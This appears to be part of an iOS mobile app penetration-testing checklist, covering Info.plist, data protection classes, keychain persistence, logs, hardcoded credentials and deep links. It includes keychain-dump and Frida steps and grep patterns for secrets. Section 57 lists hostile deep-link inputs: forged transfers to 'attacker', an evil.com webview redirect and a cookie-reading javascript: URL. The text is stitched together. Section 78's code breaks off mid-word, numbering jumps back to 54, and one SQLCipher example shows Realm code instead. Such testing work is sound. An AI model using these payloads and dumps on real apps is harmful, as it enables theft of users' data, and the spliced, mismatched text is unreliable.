IPA analysis findings:

Sensitive files found:
- config.json (API endpoints, keys)
- test_data.txt (test credentials)
- staging.plist (staging server details)

Hardcoded secrets:
- API key in strings
- Database credentials
- Encryption keys

Info.plist issues:
- ATS disabled (NSAllowsArbitraryLoads: true)
- Insecure URL schemes
- Excessive permissions

Result: Multiple security issues
```

**Generic Mitigation**:
- Remove all development/test files
- No hardcoded secrets
- Enable App Transport Security
- Minimal permissions
- Clean build process
- Automated security scanning
- Code review before release

---

### 66. Check Info.plist File

**Issue Description**: Info.plist contains critical configuration; misconfigurations lead to security issues.

**Execution Steps**:
```bash
# Analyze Info.plist:

# 1. Extract and read
unzip app.ipa
plutil -p Payload/App.app/Info.plist

# 2. Check App Transport Security
grep -A10 "NSAppTransportSecurity" Info.plist

# Look for:
NSAllowsArbitraryLoads: true  # Dangerous!
NSAllowsArbitraryLoadsInWebContent: true
NSAllowsLocalNetworking: true

# 3. Check URL schemes
grep -A5 "CFBundleURLSchemes" Info.plist

# 4. Check permissions
grep "UsageDescription" Info.plist

# Required permission keys:
NSCameraUsageDescription
NSPhotoLibraryUsageDescription
NSLocationWhenInUseUsageDescription
NSMicrophoneUsageDescription
NSContactsUsageDescription

# 5. Check background modes
grep -A5 "UIBackgroundModes" Info.plist

# 6. Check exported services
grep "CFBundleDocumentTypes" Info.plist

# 7. Security-relevant settings
grep -i "encrypt\|secure\|certificate" Info.plist

# Using plutil for better formatting
plutil -convert xml1 Info.plist -o - | less

# Using MobSF
# Upload IPA
# Check "Manifest Analysis" section
```

**Expected Output**: Secure configuration with proper ATS settings.

**Vulnerability Confirmation**:
```
Info.plist security issues:

App Transport Security:
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key>
    <true/>  <!-- Allows HTTP! -->
</dict>

Insecure URL scheme:
<key>CFBundleURLSchemes</key>
<array>
    <string>myapp</string>  <!-- No validation -->
</array>

Missing permission descriptions:
- Camera used but no NSCameraUsageDescription

Issues:
- HTTP connections allowed
- Man-in-the-middle possible
- Privacy violations
- Deep link vulnerabilities
```

**Generic Mitigation**:
- Enable App Transport Security
- Exception only for specific domains
- Implement certificate pinning
- Proper URL scheme validation
- Complete permission descriptions
- Example secure ATS:
```xml
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key>
    <false/>
    <key>NSExceptionDomains</key>
    <dict>
        <key>trusted-api.example.com</key>
        <dict>
            <key>NSIncludesSubdomains</key>
            <true/>
            <key>NSExceptionRequiresForwardSecrecy</key>
            <true/>
            <key>NSExceptionMinimumTLSVersion</key>
            <string>TLSv1.2</string>
        </dict>
    </dict>
</dict>
```

---

### 67. Check Application Data

**Issue Description**: Examining how application stores and handles user data.

**Execution Steps**:
```bash
# Analyze application data storage:

# 1. On jailbroken device
ssh root@device-ip
cd /var/mobile/Containers/Data/Application/[UUID]

# 2. Check all directories
find . -type f -ls

# 3. Examine databases
find . -name "*.sqlite" -o -name "*.db"

# Open each database
sqlite3 app.db
.schema
.tables
SELECT * FROM users;
SELECT * FROM credentials;

# Check for:
- Plaintext passwords
- Unencrypted sensitive data
- PII (Personal Identifiable Information)

# 4. Check UserDefaults/NSUserDefaults
cd Library/Preferences
plutil -p com.example.app.plist

# 5. Check file contents
cat Documents/userdata.json
cat Library/Application\ Support/config.txt

# 6. Check for cached credentials
grep -r "password\|token\|secret\|key" .

# 7. Using Objection
objection -g com.example.app explore

# List files
ios plist cat com.example.app.plist

# Dump UserDefaults
ios nsuserdefaults get

# Check SQLite databases
sqlite connect database.sqlite
.tables
select * from sensitive_table;

# 8. Check Core Data
find . -name "*.sqlite"
# Core Data SQLite files

# 9. Analyze file protection
ls -lO Documents/
# Check for protection class attributes

# 10. Check backup status
# Files in Documents/ are backed up
# Sensitive data should not be in backups
```

**Expected Output**: Sensitive data encrypted and properly protected.

**Vulnerability Confirmation**:
```
Insecure data storage found:

SQLite database (unencrypted):
users.sqlite contains:
| id | username | password      | email |
|----|----------|---------------|-------|
| 1  | admin    | admin123      | ...   |
| 2  | user1    | plaintextpass | ...   |

UserDefaults (plaintext):
com.example.app.plist:
<key>api_token</key>
<string>sk_live_abc123xyz789</string>
<key>user_session</key>
<string>session_12345</string>

Files:
Documents/credentials.txt (plaintext)
Library/cache/api_keys.json (plaintext)

No encryption
No data protection
Included in backups

Result: Complete data exposure
```

**Generic Mitigation**:
- Encrypt databases with SQLCipher
- Use iOS Keychain for credentials
- Implement Data Protection API
- Don't store sensitive data in UserDefaults
- Exclude sensitive files from backup
- Example:
```swift
// Encrypt database with SQLCipher
let config = Realm.Configuration(
    encryptionKey: getKey(),
    fileURL: fileURL
)

// Exclude from backup
var resourceValues = URLResourceValues()
resourceValues.isExcludedFromBackup = true
try fileURL.setResourceValues(resourceValues)

// Use Keychain
let keychain = KeychainSwift()
keychain.set("password123", forKey: "user_password")
```

---

### 68. Checking for Data Protection of API

**Issue Description**: Verifying file-level encryption using iOS Data Protection API.

**Execution Steps**:
```bash
# Check data protection implementation:

# 1. On jailbroken device
ssh root@device-ip
cd /var/mobile/Containers/Data/Application/[UUID]

# 2. Check file protection attributes
ls -lO Documents/sensitive.db

# Output shows protection class:
-rw-r--r-- 1 mobile mobile - 12345 Jan 1 12:00 sensitive.db
# "-" indicates no protection class

# Protection classes:
# NSFileProtectionComplete (class A)
# NSFileProtectionCompleteUnlessOpen (class B)
# NSFileProtectionCompleteUntilFirstUserAuthentication (class C)
# NSFileProtectionNone (class D)

# 3. Test file access when locked
# Lock device
# Try to access file
cat Documents/sensitive.db
# Should fail if properly protected

# 4. Check with Objection
objection -g com.example.app explore
ios plist cat Documents/data.plist

# 5. Programmatically check (in code review)
# Look for:
try data.write(to: url, options: .completeFileProtection)
// or
let attributes = [FileAttributeKey.protectionKey: FileProtectionType.complete]

# 6. Test scenarios
# Create file with protection
# Lock device
# Attempt access → should fail
# Unlock device
# Attempt access → should succeed

# 7. Check Info.plist for data protection entitlement
codesign -d --entitlements :- App
# Look for com.apple.developer.default-data-protection

# Using instruments to monitor
instruments -t "File Activity" -D output.trace

# Check Core Data protection
# Core Data NSPersistentStoreFileProtectionKey
```

**Expected Output**: Sensitive files use appropriate protection classes.

**Vulnerability Confirmation**:
```
No data protection:

File check:
ls -lO sensitive.db
-rw-r--r-- 1 mobile mobile - 12345 sensitive.db
# No protection class indicator

File accessible when device locked:
cat /Documents/passwords.txt → Success
# Should fail!

Code analysis:
// No protection specified
try data.write(to: fileURL)

// UserDefaults not protected
UserDefaults.standard.set(token, forKey: "auth")

Result: Data accessible even when locked
```

**Generic Mitigation**:
- Use appropriate protection classes
- Complete: Most sensitive data
- CompleteUnlessOpen: Active files
- CompleteUntilFirstUserAuthentication: Background tasks
- Example implementation:
```swift
// File protection
let data = sensitiveData.data(using: .utf8)!
try data.write(to: fileURL, options: .completeFileProtection)

// Or using FileManager
let attributes = [
    FileAttributeKey.protectionKey: FileProtectionType.complete
]
try FileManager.default.setAttributes(attributes, ofItemAtPath: path)

// Core Data
let description = NSPersistentStoreDescription()
description.setOption(
    FileProtectionType.complete as NSObject,
    forKey: NSPersistentStoreFileProtectionKey
)

// Set default data protection
// In entitlements:
<key>com.apple.developer.default-data-protection</key>
<string>NSFileProtectionComplete</string>
```

---

## INSECURE DATA STORAGE

### 69-72. Check NSFileProtection Classes

**Issue Description**: Testing various NSFileProtection classes and their implementation.

**Execution Steps**:
```bash
# Test all protection classes:

# NSFileProtectionComplete (69)
# Highest protection - encrypted until device unlocked

# NSFileProtectionCompleteUntilFirstUserAuthentication (70)
# Protected until first unlock after reboot

# NSFileProtectionCompleteUnlessOpen (71)
# Protected except when file is open

# NSFileProtectionNone (72)
# No protection

# Testing methodology:

# 1. Check current protection
ssh root@device-ip
cd /var/mobile/Containers/Data/Application/[UUID]/Documents
ls -lO file.db

# 2. Test Complete protection
# Create file with Complete protection
# Lock device immediately
# Try to access → Should fail
cat file.db  # Access denied

# 3. Test CompleteUntilFirstUserAuthentication
# Reboot device
# Before unlock, try access → Fail
# After first unlock → Success
# Lock again → Still accessible

# 4. Test CompleteUnlessOpen
# Open file
# Lock device
# File remains accessible while open
# Close file → Protected

# 5. Test None
# No protection
# Always accessible

# Using Objection to verify:
objection -g com.example.app explore
ios plist cat protected_file.plist

# Code review check:
# Look for protection class usage:
grep -r "FileProtection" .
grep -r "completeFileProtection" .
grep -r "NSPersistentStoreFileProtectionKey" .
```

**Expected Output**: Appropriate protection class for data sensitivity.

**Vulnerability Confirmation**:
```
Protection class issues:

Sensitive data without protection:
- passwords.db (NSFileProtectionNone)
- credit_cards.sqlite (No protection)
- session_tokens.txt (No protection)

Inappropriate protection:
- Background sync data (Complete) → App fails
- User photos (None) → Should be protected

Recommendations:
- Passwords: Complete
- Session tokens: Complete
- User documents: Complete
- Cache data: CompleteUntilFirstUserAuthentication
- Temporary: CompleteUnlessOpen
```

**Generic Mitigation**:
- Choose appropriate protection class based on data sensitivity and usage
- Most sensitive: NSFileProtectionComplete
- Background operations: NSFileProtectionCompleteUntilFirstUserAuthentication
- Active file operations: NSFileProtectionCompleteUnlessOpen
- Never use None for sensitive data

---

### 73. Check Data Protection Classes

**Issue Description**: Comprehensive review of data protection implementation across app.

**Execution Steps**:
```bash
# Comprehensive data protection audit:

# 1. Inventory all data storage
find /var/mobile/Containers/Data/Application/[UUID] -type f

# 2. Classify data by sensitivity
# High: Credentials, financial, health, PII
# Medium: User preferences, app state
# Low: Cached images, temporary data

# 3. Verify protection for each
for file in $(find Documents -type f); do
    echo "File: $file"
    ls -lO "$file"
    echo "---"
done

# 4. Check database encryption
file *.sqlite
# Should show encrypted or SQLCipher

# 5. Check Keychain usage
# Using Objection:
ios keychain dump

# Should contain:
- Passwords
- Tokens
- API keys
- Certificates

# 6. Check Core Data protection
# Review NSPersistentStoreDescription
grep -r "NSPersistentStoreFileProtectionKey" .

# 7. Check UserDefaults
# Should NOT contain sensitive data
plutil -p Library/Preferences/*.plist | grep -i "password\|token\|key"

# 8. Test backup inclusion
# Check if sensitive files excluded from backup
ios info backup

# 9. Memory analysis
# Check if sensitive data cleared from memory
# Using Frida to dump memory
frida -U -f com.example.app -l memory_dump.js

# 10. Create protection matrix
# File -> Protection Class -> Appropriate?
```

**Expected Output**: All data properly classified and protected.

**Vulnerability Confirmation**:
```
Data protection audit findings:

CRITICAL ISSUES:
1. Passwords in UserDefaults (plaintext)
2. Credit card numbers in unprotected SQLite
3. API keys in unencrypted plist files
4. Session tokens in application support (no protection)

MEDIUM ISSUES:
5. User documents without Complete protection
6. Sensitive cache not excluded from backup
7. Health data using wrong protection class

LOW ISSUES:
8. Temporary files not cleaned up
9. Logs contain sensitive information

Protection matrix:
File Type          | Current    | Required   | Status
-------------------|------------|------------|--------
passwords.db       | None       | Complete   | FAIL
session_tokens.txt | None       | Complete   | FAIL
user_docs/         | Until1st   | Complete   | WARN
cache/             | None       | Until1st   | WARN
```

**Generic Mitigation**:
- Implement data classification policy
- Use Keychain for all credentials
- Encrypt databases (SQLCipher)
- Appropriate protection classes
- Exclude sensitive data from backups
- Clear sensitive data from memory
- Regular security audits
- Automated testing

---

## SECURITY MISCONFIGURATION

### 74. Checking for plist Files

**Issue Description**: Plist files may contain sensitive configuration data in plaintext.

**Execution Steps**:
```bash
# Analyze plist files:

# 1. Find all plist files
find /var/mobile/Containers/Data/Application/[UUID] -name "*.plist"

# 2. Check Info.plist (in IPA)
unzip app.ipa
plutil -p Payload/App.app/Info.plist

# 3. Check preferences plist
cd Library/Preferences
ls -la *.plist
plutil -p com.example.app.plist

# Look for:
- API keys
- Endpoints
- Credentials
- Tokens
- Secret configurations

# 4. Convert binary plist to XML
plutil -convert xml1 com.example.app.plist -o readable.plist
cat readable.plist

# 5. Search for sensitive keywords
grep -i "password\|secret\|key\|token\|api" *.plist

# 6. Check Settings bundle
cd Payload/App.app/Settings.bundle
cat Root.plist

# 7. Using Objection
objection -g com.example.app explore
ios plist cat com.example.app.plist

# 8. Check for hardcoded values
strings Payload/App.app/App | grep ".plist"

# 9. Analyze with MobSF
# Upload IPA
# Check "Code Analysis" → plist files section
```

**Expected Output**: No sensitive data in plist files.

**Vulnerability Confirmation**:
```
Sensitive data in plist files:

com.example.app.plist:
<key>APIKey</key>
<string>sk_live_abc123xyz789</string>
<key>DatabaseURL</key>
<string>mysql://admin:pass@db.internal.com</string>
<key>DebugMode</key>
<true/>
<key>AdminPassword</key>
<string>admin123</string>

Settings.bundle/Root.plist:
<key>DefaultUsername</key>
<string>administrator</string>

Result: Credentials and secrets exposed
```

**Generic Mitigation**:
- Never store secrets in plist files
- Use Keychain for sensitive data
- Encrypt configuration files
- Server-side configuration
- Remove debug settings from production
- Environment-based configs
- Example secure approach:
```swift
// Don't store in plist
// Use Keychain instead
let keychain = KeychainSwift()
if let apiKey = keychain.get("api_key") {
    // Use apiKey
}

// Or fetch from server
fetchConfiguration { config in
    // Use server-provided config
}
```

---

### 75. Check Screenshots

**Issue Description**: Screenshots may capture sensitive information visible in app memory or UI.

**Execution Steps**:
```bash
# Test screenshot protection:

# 1. Navigate to sensitive screens
- Login page
- Account details
- Credit card information
- Personal data

# 2. Take screenshots
# On device: Power + Volume Up
# Programmatically: Simulate screenshot event

# 3. Check screenshot files
cd /var/mobile/Containers/Data/Application/[UUID]/Library/Caches/Snapshots
ls -la

# Screenshots for app switcher stored here

# 4. Test app switcher view
# Enter sensitive screen
# Press home button
# Check app switcher
# Does it show sensitive data?

# 5. Using Frida to test
# Monitor screenshot notifications:
frida -U -f com.example.app

# Script to detect screenshots:
ObjC.choose(ObjC.classes.UIWindow, {
    onMatch: function(window) {
        console.log("Window: " + window);
    }
});

# 6. Check for protection implementation
# Look for:
- UIApplicationUserDidTakeScreenshotNotification
- Blur/hide on resign active
- setShowsBackgroundLocationIndicator

# 7. Test sensitive data visibility
# View account with balance
# Minimize app
# Check snapshot
# Is balance visible?

# Code review:
grep -r "UserDidTakeScreenshot" .
grep -r "resignActive" .
grep -r "didEnterBackground" .
```

**Expected Output**: Sensitive screens protected from screenshots.

**Vulnerability Confirmation**:
```
Screenshot protection missing:

Test results:
1. Screenshot taken on login page
   → Username and password visible

2. App switcher shows:
   → Credit card number
   → Account balance
   → Personal information

3. Cached snapshots contain:
   Snapshots/com.example.app/
   └── sensitive_data_visible.jpg

4. No screenshot detection implemented

Result: Sensitive data leakage via screenshots
```

**Generic Mitigation**:
- Detect screenshot attempts
- Hide sensitive views when backgrounded
- Blur screen in app switcher
- Show placeholder instead of sensitive data
- Clear sensitive data before backgrounding
- Example implementation:
```swift
// Detect screenshots
NotificationCenter.default.addObserver(
    forName: UIApplication.userDidTakeScreenshotNotification,
    object: nil,
    queue: .main
) { _ in
    // Log, alert, or take action
    print("Screenshot detected!")
}

// Hide sensitive content when backgrounding
func applicationWillResignActive(_ application: UIApplication) {
    // Add blur or hide sensitive views
    let blurEffect = UIBlurEffect(style: .light)
    let blurView = UIVisualEffectView(effect: blurEffect)
    blurView.frame = window!.frame
    blurView.tag = 999
    window?.addSubview(blurView)
}

func applicationDidBecomeActive(_ application: UIApplication) {
    // Remove blur
    window?.viewWithTag(999)?.removeFromSuperview()
}

// Prevent snapshots for app switcher
if let textField = sensitiveTextField {
    textField.isSecureTextEntry = true
    // Or hide entire window:
    window?.isHidden = true  // in resignActive
    window?.isHidden = false // in didBecomeActive
}
```

---

### 76. Check Keychain Persistence

**Issue Description**: Keychain data may persist after app uninstall, potentially exposing sensitive data.

**Execution Steps**:
```bash
# Test Keychain persistence:

# 1. Install app and login
# Credentials stored in Keychain

# 2. Dump Keychain before uninstall
# Using Objection:
objection -g com.example.app explore
ios keychain dump

# Note all items and accessibility

# 3. Uninstall app
# Delete from device

# 4. Reinstall app
# Install same app again

# 5. Check Keychain after reinstall
objection -g com.example.app explore
ios keychain dump

# Are previous credentials still there?

# 6. Test with different accessibility levels
# kSecAttrAccessibleAlways
# kSecAttrAccessibleWhenUnlocked
# kSecAttrAccessibleAfterFirstUnlock
# kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly
# kSecAttrAccessibleWhenUnlockedThisDeviceOnly

# 7. Check access groups
# Items with access group persist

# Using Keychain-Dumper:
git clone https://github.com/ptoomey3/Keychain-Dumper
./keychain_dumper

# 8. Test scenarios:
# - Uninstall/Reinstall
# - Device restore
# - iCloud Keychain sync

# Code review:
grep -r "kSecAttrAccessible" .
grep -r "kSecAttrAccessGroup" .
```

**Expected Output**: Sensitive Keychain items cleared on uninstall or use ThisDeviceOnly.

**Vulnerability Confirmation**:
```
Keychain persistence issues:

Before uninstall:
Service: com.example.app
Account: user@example.com
Password: user_password_123
Accessibility: kSecAttrAccessibleAlways

After uninstall and reinstall:
Same items still present!

Issues:
- Credentials persist after uninstall
- No "ThisDeviceOnly" attribute
- Sync to iCloud enabled
- Access group allows other apps

Risks:
- Stolen devices
- Shared devices
- iCloud compromise
- Cross-app data leakage
```

**Generic Mitigation**:
- Use kSecAttrAccessibleWhenUnlockedThisDeviceOnly
- Clear Keychain on logout
- Don't use access groups unless necessary
- Implement secure deletion
- Use appropriate accessibility levels
- Example:
```swift
// Secure Keychain storage
let query: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrAccount as String: "username",
    kSecValueData as String: passwordData,
    kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly
]
SecItemAdd(query as CFDictionary, nil)

// Delete on logout
func clearKeychain() {
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword
    ]
    SecItemDelete(query as CFDictionary)
}
```

---

### 77. Check if UI Screens with Sensitive Details Are Protected Against Screenshots

**Issue Description**: Specific sensitive screens should prevent screenshot capture.

**Execution Steps**:
```bash
# Test per-screen screenshot protection:

# 1. Identify sensitive screens:
- Login/Registration
- Payment/Credit card entry
- Account balance/statements
- Personal information
- Medical records
- Confidential documents

# 2. Test each screen:
# Navigate to screen
# Attempt screenshot
# Check if captured or blocked

# 3. Test app switcher:
# On sensitive screen
# Press home
# Check app switcher preview

# 4. Test with different iOS versions
# Protection may vary

# 5. Using Frida to monitor:
frida -U -f com.example.app -l screenshot_monitor.js

# Frida script:
Interceptor.attach(
    ObjC.classes.UIScreen['- _createIOSurfaceWithContextIds:count:'].implementation,
    {
        onEnter: function(args) {
            console.log("Screenshot attempt on: " + ObjC.chooseSync(ObjC.classes.UIViewController)[0]);
        }
    }
);

# 6. Code review for each view controller:
grep -r "isSecureTextEntry\|userDidTakeScreenshot" ViewControllers/

# 7. Test UITextField security:
# Check if isSecureTextEntry is true for sensitive fields

# 8. Visual inspection:
# Compare screenshots of each screen
# Verify sensitive data not visible
```

**Expected Output**: Sensitive screens protected, others may allow screenshots.

**Vulnerability Confirmation**:
```
Screen-specific findings:

UNPROTECTED SCREENS:
1. Credit Card Entry Screen
   → Full card number visible in screenshot
   
2. Account Balance Screen
   → Balance and account number captured
   
3. Settings/Profile Screen
   → Email, phone, address visible
   
4. Payment History
   → Transaction details captured

PROTECTED SCREENS:
✓ Login screen (using secure text entry)

App switcher shows:
- Unblurred sensitive screens
- Full data visibility

Result: Most sensitive screens unprotected
```

**Generic Mitigation**:
- Implement per-view controller protection
- Hide sensitive views on background
- Use secure text entry for inputs
- Custom UITextField for protection
- Example per-screen:
```swift
class SensitiveViewController: UIViewController {
    
    private var blurView: UIVisualEffectView?
    
    override func viewDidLoad() {
        super.viewDidLoad()
        setupScreenshotProtection()
    }
    
    private func setupScreenshotProtection() {
        // Detect screenshots
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(screenshotTaken),
            name: UIApplication.userDidTakeScreenshotNotification,
            object: nil
        )
        
        // Protect app switcher
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(hideContent),
            name: UIApplication.willResignActiveNotification,
            object: nil
        )
        
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(showContent),
            name: UIApplication.didBecomeActiveNotification,
            object: nil
        )
    }
    
    @objc private func screenshotTaken() {
        // Log or alert
        showAlert("Screenshots are not allowed on this screen")
    }
    
    @objc private func hideContent() {
        let blurEffect = UIBlurEffect(style: .light)
        let blurView = UIVisualEffectView(effect: blurEffect)
        blurView.frame = view.bounds
        blurView.tag = 100
        view.addSubview(blurView)
        self.blurView = blurView
    }
    
    @objc private func showContent() {
        blurView?.removeFromSuperview()
    }
}
```

---

## APPLICATION LOGS

### 78. Check App Logs

**Issue Description**: Application logs may contain sensitive information that aids attackers.

**Execution Steps**:
```bash
# Analyze application logs:

# 1. Check system logs
# On jailbroken device:
ssh root@device-ip
tail -f /var/log/syslog

# Or using Console.app on Mac:
# Connect device
# Open Console.app
# Filter by app bundle ID

# 2. Check app-specific logs
cd /var/mobile/Containers/Data/Application/[UUID]/Library/Caches
find . -name "*.log"
cat application.log

# 3. Monitor real-time logs
# Using idevicesyslog:
idevicesyslog | grep "com.example.app"

# 4. Using Xcode Console
# Connect device
# Window → Devices and Simulators
# Select device
# View Device Logs

# 5. Check for sensitive data in logs:
grep -i "password\|token\|secret\|api_key\|credit" *.log

# 6. Using Objection:
objection -g com.example.app explore
ios hooking watch class Logger

# 7. Check NSLog statements
# Monitor output for:
- Authentication tokens
- API responses with sensitive data
- User credentials
- Session IDs
- Stack traces with data
- Database queries

# 8. Analyze log files
cd /var/mobile/Containers/Data/Application/[UUID]
find . -name "*.log" -exec cat {} \;

# 9. Test different log levels
# Debug vs Production
# Check if debug logs disabled in production

# Code review:
grep -r "NSLog\|print\|os_log\|DDLog" .
# Check what's being logged
```

**Expected Output**: Logs contain no sensitive information.

**Vulnerability Confirmation**:
```
Sensitive data in logs:

application.log:
2024-01-15 10:23:45 [INFO] User logged in: username=admin, password=admin123
2024-01-15 10:24:12 [DEBUG] API Token: sk_live_abc123xyz789
2024-01-15 10:24:30 [INFO] Credit card: 4532-1234-5678-9010, CVV: 123
2024-01-15 10:25:00 [ERROR] Database query: SELECT * FROM users WHERE id=123
2024-01-15 10:25:15 [DEBUG] Session ID: abc123xyz789def456
2024-01-15 10:26:00 [INFO] API Response: {"user_data": {"ssn": "123-45-6789"}}

System logs show:
com.example.app: Keychain password: user_password_123
com.example.app: Internal server: http://192.168.1.50/api

Result: Complete information disclosure
```

**Generic Mitigation**:
- Remove or disable verbose logging in production
- Never log sensitive data:
  - Passwords
  - Tokens
  - API keys
  - Credit cards
  - PII
  - Session IDs
- Use proper log levels
- Sanitize logs before writing
- Implement secure logging framework
- Example:
```swift
// Don't do this:
NSLog("User password: \(password)")
print("API Token: \(apiKey)")

// Do this:
os_log("User authenticated", log: .default, type: .info)
// Redact sensitive data
os_log("API request to: %{public}@, token: %{private}@", endpoint, "[REDACTED]")

// Custom logger with filtering
class SecureLogger {
    static func log(_ message: String) {
        #if DEBUG
        // Only log in debug builds
        let sanitized = sanitize(message)
        os_log("%{public}@", sanitized)
        #endif
    }
    
    private5. Verify if password appears
```

**Expected Output**: Clipboard disabled for sensitive fields.

**Vulnerability Confirmation**:
```
Clipboard enabled on:
- Password fields
- OTP input
- Credit card fields
- Session tokens

Risk: Malicious apps can monitor clipboard
```

**Generic Mitigation**:
- Disable copy/paste on sensitive fields
- Clear clipboard after app closes
- Use secure text entry
- Implement clipboard monitoring detection
- Example code:
```swift
// Disable copy/paste
textField.isSecureTextEntry = true

// Custom UITextField
class SecureTextField: UITextField {
    override func canPerformAction(_ action: Selector, withSender sender: Any?) -> Bool {
        if action == #selector(UIResponderStandardEditActions.copy(_:)) ||
           action == #selector(UIResponderStandardEditActions.paste(_:)) {
            return false
        }
        return super.canPerformAction(action, withSender: sender)
    }
}
```

---

### 54. Redundant Permissions Granted / Insecure Application Permissions

**Issue Description**: App requests unnecessary permissions that increase attack surface.

**Execution Steps**:
```bash
# Analyze app permissions:

# 1. Check Info.plist
unzip app.ipa
plutil -p Payload/App.app/Info.plist | grep -i "usage"

# Look for permissions:
NSCameraUsageDescription
NSPhotoLibraryUsageDescription
NSLocationWhenInUseUsageDescription
NSLocationAlwaysUsageDescription
NSMicrophoneUsageDescription
NSContactsUsageDescription
NSCalendarsUsageDescription
NSBluetoothPeripheralUsageDescription

# 2. Review entitlements
codesign -d --entitlements :- Payload/App.app/App

# Check for:
- Keychain access groups
- Associated domains
- App groups
- iCloud containers

# 3. Test permission requests
1. Install app
2. Monitor permission prompts
3. Identify unnecessary permissions
4. Check if app works without granting

# 4. Analyze functionality
Does a calculator app need:
- Camera access? (No)
- Location? (No)
- Contacts? (No)

# Using MobSF:
Upload IPA, check Permissions section
```

**Expected Output**: Only necessary permissions requested.

**Vulnerability Confirmation**:
```
Excessive permissions:
Simple note-taking app requests:
✓ Camera
✓ Microphone
✓ Location (Always)
✓ Contacts
✓ Photo Library

None needed for core functionality!

Privacy risks:
- Data collection
- User tracking
- Information disclosure
```

**Generic Mitigation**:
- Request minimum necessary permissions
- Request permissions when needed (not at launch)
- Explain why permission needed
- Function without optional permissions
- Regular permission audits
- Remove unused permission declarations
- Implement permission best practices

---

## CODE REVIEW

### 55. Testing for Hardcoded Credentials

**Issue Description**: Credentials hardcoded in app binary can be extracted and abused.

**Execution Steps**:
```bash
# Search for hardcoded credentials:

# 1. Extract and analyze binary
unzip app.ipa
cd Payload/App.app

# 2. Search for common patterns
strings App | grep -i password
strings App | grep -i api_key
strings App | grep -i secret
strings App | grep -i token
strings App | grep -i "username"

# 3. Use class-dump
class-dump App > classes.txt
grep -i "password\|secret\|key" classes.txt

# 4. Analyze with Hopper Disassembler
Open binary in Hopper
Search for strings:
- "password"
- "api_key"
- "secret_key"
- "admin"

# 5. Check configuration files
grep -r "password" .
grep -r "api_key" .
cat config.plist
cat Settings.bundle/Root.plist

# 6. Using MobSF
Upload IPA
Check "Code Analysis" section
Review hardcoded secrets

# 7. Check Info.plist
plutil -p Info.plist | grep -i "key\|secret\|password"

# Common patterns to search:
NSString *password = @"hardcoded123";
NSString *apiKey = @"sk_live_abc123xyz";
#define API_KEY "secret_key_here"
let password = "admin123"

# Using nm tool
nm -a App | grep -i secret
```

**Expected Output**: No hardcoded credentials in binary.

**Vulnerability Confirmation**:
```
Hardcoded credentials found:

strings output:
admin:admin123
api_key=sk_live_abc123xyz789
db_password=MySecretPass123
secret_token=a1b2c3d4e5f6

In code:
NSString *defaultPassword = @"admin123";
let apiKey = "AIzaSyAbCdEfGhIjKlMnOpQrStUvWxYz"

Result: Complete compromise
```

**Generic Mitigation**:
- Never hardcode credentials
- Use iOS Keychain for storage
- Environment variables for configuration
- Secure server-side storage
- Encrypt sensitive configurations
- Use secure configuration management
- Code review and scanning tools
- Example secure storage:
```swift
// Store in Keychain
let keychain = KeychainSwift()
keychain.set("user_password", forKey: "password")

// Retrieve
if let password = keychain.get("password") {
    // Use password
}
```

---

### 56. Private IP Disclosure

**Issue Description**: Private IP addresses or internal network information exposed in app.

**Execution Steps**:
```bash
# Search for IP addresses:

# 1. Extract strings from binary
strings App | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'

# Look for:
- 192.168.x.x
- 10.x.x.x
- 172.16-31.x.x
- 127.0.0.1

# 2. Check configuration files
grep -r "192.168\|10\.\|172\." .

# 3. Analyze network traffic
# Using proxy, check for:
- Internal IP addresses in requests
- Private network references
- Development server IPs

# 4. Check for internal hostnames
strings App | grep -i "internal\|dev\|staging\|test"

# 5. Review API endpoints
Look for:
http://192.168.1.100/api
http://internal-server.local
http://dev-server:8080

# 6. Check Info.plist
plutil -p Info.plist | grep -E '[0-9]{1,3}\.[0-9]{1,3}'

# Using MobSF:
Check for IP addresses in:
- Code analysis
- Network security
- Manifest analysis
```

**Expected Output**: No internal IP addresses or hostnames exposed.

**Vulnerability Confirmation**:
```
Private IPs found:

strings output:
http://192.168.1.50/api/v1
dev_server: 10.0.0.15
internal_db: 172.16.50.100

In traffic:
X-Internal-IP: 192.168.1.50
Debug-Server: internal-api.company.local

Information disclosed:
- Network topology
- Internal infrastructure
- Development environment details
```

**Generic Mitigation**:
- Use public endpoints only
- Remove development/debug code
- Environment-specific configurations
- Use DNS names (not IPs)
- Code obfuscation
- Proper build configurations
- Separate debug/release builds

---

### 57. Check for Deep Links Schema

**Issue Description**: Insecure deep link handling can lead to unauthorized actions or data exposure.

**Execution Steps**:
```bash
# Analyze deep link configuration:

# 1. Check Info.plist for URL schemes
plutil -p Info.plist | grep -A5 "CFBundleURLSchemes"

# Output example:
CFBundleURLSchemes => [
    "myapp",
    "com.example.app"
]

# 2. Test deep links
# Create test HTML file:
<a href="myapp://reset?token=abc123">Test Link</a>
<a href="myapp://payment?amount=100&to=attacker">Payment</a>
<a href="myapp://user/profile?id=123">Profile</a>

# 3. Test parameter injection
myapp://action?param=value&admin=true
myapp://transfer?from=victim&to=attacker&amount=1000
myapp://settings?debug=true
myapp://webview?url=https://evil.com

# 4. Test URL validation
myapp://webview?url=javascript:alert(1)
myapp://redirect?url=https://phishing.com

# 5. Using Frida to monitor deep links
# Frida script:
Interceptor.attach(
    ObjC.classes.UIApplication['- openURL:'].implementation,
    {
        onEnter: function(args) {
            var url = new ObjC.Object(args[2]);
            console.log("Deep link: " + url.toString());
        }
    }
);

# 6. Automated testing
# Create various malicious deep links:
for url in deep_links.txt; do
    open "$url"
    sleep 2
done

# Test cases:
myapp://delete?id=123
myapp://admin/users
myapp://executeCommand?cmd=malicious
```

**Expected Output**: Deep links validated and sanitized before processing.

**Vulnerability Confirmation**:
```
Insecure deep link handling:

No validation:
myapp://payment?to=attacker&amount=9999 → Executes!
myapp://admin/deleteAllUsers → Executes!
myapp://webview?url=javascript:alert(document.cookie) → XSS!

Issues:
- No parameter validation
- No authentication required
- Direct command execution
- Open redirect possible
- XSS in WebView

Result: Unauthorized actions
```

**Generic Mitigation**:
